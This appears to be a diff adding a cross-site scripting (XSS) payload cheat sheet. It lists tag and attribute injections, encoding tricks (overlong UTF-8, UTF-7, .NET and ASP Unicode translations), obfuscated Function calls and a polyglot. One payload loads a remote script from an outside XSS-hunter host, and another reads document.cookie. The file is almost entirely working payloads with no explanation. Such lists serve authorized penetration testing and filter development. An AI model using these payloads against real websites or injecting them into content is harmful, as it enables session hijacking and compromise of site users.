@@ -1,0 +1,51 @@
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+onclick="alert('1')"
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+"><svg>
+">'-alert(1)-'<svg>
+">';alert(1);'<=svg>
+p="><!--
+q=--><svg onload=alert(1)>
+p="1='
+q='><svg onload=alert(1)>
+';a=alert;a(1);//
+">'><details/open/ontoggle=confirm('XSS')> ⌝
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/ ⌝
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt; ⌝
+Function`$${atob`YWxlcnQoMSk=`}```
+`$${"alert(1)"}`
+"><script src=https://locu.xss.ht></script>
+<xss style="-webkit-user-modify:read-write" onfocus=alert(23) autofocus>
+<xss onfocus=alert(23) autofocus contenteditable>
+<svg/OnLoad="`${prompt``}`">
+"><x/Onpointerrawupdate=confirm(document.cookie)>
+
+Overlong UTF-8 
+< = %C0%BC = %E0%80%BC = %F0%80%80%BC
+> = %C0%BE = %E0%80%BE = %F0%80%80%BE
+' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
+" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
+
+<img src="1" onnerror="alert(1)">
+%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE
+
+UTF-7 (Missing charset?)
+<img src="1" onerror="alert(1)" />
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+
+Unicode .NET Ugliness
+<script>alert(1)</script>
+%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
+
+Classic ASP performs some unicode homoglyphic translations... don't ask why...
+<img src="1" onerror="alert('1')">
+%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A
+
+
+Polyglot
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
